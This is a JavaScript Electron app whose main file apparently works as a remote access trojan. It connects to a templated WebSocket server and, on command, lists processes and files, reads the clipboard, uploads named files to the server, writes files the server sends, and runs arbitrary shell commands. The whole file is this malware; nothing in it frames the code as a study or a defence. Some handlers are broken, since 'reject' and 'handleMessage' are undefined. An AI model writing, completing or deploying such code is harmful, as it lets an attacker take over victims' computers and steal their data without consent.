const { app, BrowserWindow, clipboard } = require('electron');
const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

let mainWindow;
let ws;
function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
  });

  mainWindow.loadFile('index.html');
  //ws = new WebSocket('ws://127.0.0.1:8081/ws');
  ws = new WebSocket('ws://{ip}:{port}/ws');

  ws.on('open', () => {
    ws.send(JSON.stringify({ device_name: 'YourDeviceName' }));
  });

  ws.on('message', (message) => 
    {
      if (isJson(message)) {
        const data = JSON.parse(message);
        handleServerCommand(data,ws);
    } else {
      if (global.fileWriteHandle) {
        global.fileWriteHandle.write(message);
        console.log(`Received file chunk: ${message.length} bytes.`);
      } else {
        console.error("Error: Received file data without an active download.");
      }
    }
  });
  ws.on("error", (err) => {
    console.error("WebSocket error:", err.message);
    ws.off("message", handleMessage); 
    reject(err);
  });

  ws.on("close", () => {
    console.log("WebSocket closed.");
    ws.off("message", handleMessage); 
    reject(new Error("WebSocket closed unexpectedly."));
  });
}

function isJson(str) {
  try {
    const obj = JSON.parse(str);
    if (obj && typeof obj == 'object') return true;
  } catch (e) {}

  return false;
}

function handleServerCommand(data,ws) {
  console.log(`Received data: "${data}"`);
  console.log(`Received command: "${data.command}"`);
  switch (true) {
    case data.command == 'list_processes':
      exec('ps aux', (err, stdout) => {
        if (!err) sendResponse(stdout);
      });
      break;
    case data.command == 'list_files':
      fs.readdir(process.cwd(), (err, files) => {
        const fileListAsString = files.join(', ');
        console.log(fileListAsString);
        if (!err) sendResponse(fileListAsString);
      });
      break;
    case data.command == 'get_clipboard':
      sendResponse(clipboard.readText());
      break;
    case data.command && data.command.startsWith('upload_file'):
      const part1 = data.command.split(' ');
      console.log(part1)
      if (part1.length > 1) {
        const fileName = part1.slice(1).join(' ');
        uploadFile(fileName,ws);
      } else {
        console.error('Invalid command format: file name is missing.');
      }
      break;
    case data.command && data.command.startsWith('download_file'):
      const part2 = data.command.split(' ');
      console.log(part2)
      if (part2.length > 1) {
        const fileName = part2.slice(1).join(' ');
        downloadFile(fileName,ws);
      } else {
        console.error('Invalid command format: file name is missing.');
      }
      break;
    case data.command && data.command.startsWith('execute_command'):
      console.log(data.command.split(' ').slice(1).join(' '))
      exec(data.command.split(' ').slice(1).join(' '), (err, stdout) => {
        if (!err) sendResponse(stdout);
      });
      break;
    default:
      console.log('Unknown command');
      console.log(data)
  }
}

function sendResponse(result) {
  console.log(JSON.stringify({ action: "send_result",status:"success",result: result }))
  ws.send(JSON.stringify({ action: "send_result",status:"success",result: result }));
}

async function uploadFile(filePath,ws) {
  try {
    const fileStats = fs.statSync(filePath);
    const filename = fileStats.isFile() ? filePath.split("/").pop() : null;
    const filesize = fileStats.size;

    if (!filename) {
      throw new Error("Invalid file path or not a file.");
    }

    const uploadRequest = {
      action: "upload_file",
      filename: filename,
      filesize: filesize,
    };

    ws.send(JSON.stringify(uploadRequest));
    console.log(`Upload request sent: ${JSON.stringify(uploadRequest)}`);

    const readStream = fs.createReadStream(filePath, { highWaterMark: 1024 * 4 });

    readStream.on("data", (chunk) => {
      ws.send(chunk);
      console.log(`Sent chunk of size: ${chunk.length}`);
    });

    readStream.on("end", () => {
      console.log("File upload completed. Sending completion message.");
      const uploadCompleteMessage = {
        action: "upload_completed",
      };
      ws.send(JSON.stringify(uploadCompleteMessage));
    });

    readStream.on("error", (err) => {
      console.error("Error reading file:", err);
      throw new Error(`File read error: ${err.message}`);
    });
  } catch (error) {
    console.error("Error in uploadFile function:", error.message);
    throw error;
  }
}

async function downloadFile(filename,ws ) {
  return new Promise((resolve, reject) => {
    try {
      const downloadRequest = {
        action: "download_file",
        filename: filename,
      };
      ws.send(JSON.stringify(downloadRequest));
      console.log(`Download request sent: ${JSON.stringify(downloadRequest)}`);

      global.fileWriteHandle = fs.createWriteStream(filename);
      const writeStream = fs.createWriteStream(filename);
    } catch (error) {
      console.error("Error in downloadFile function:", error.message);
      reject(error);
    }
  });
}

app.whenReady().then(createWindow);
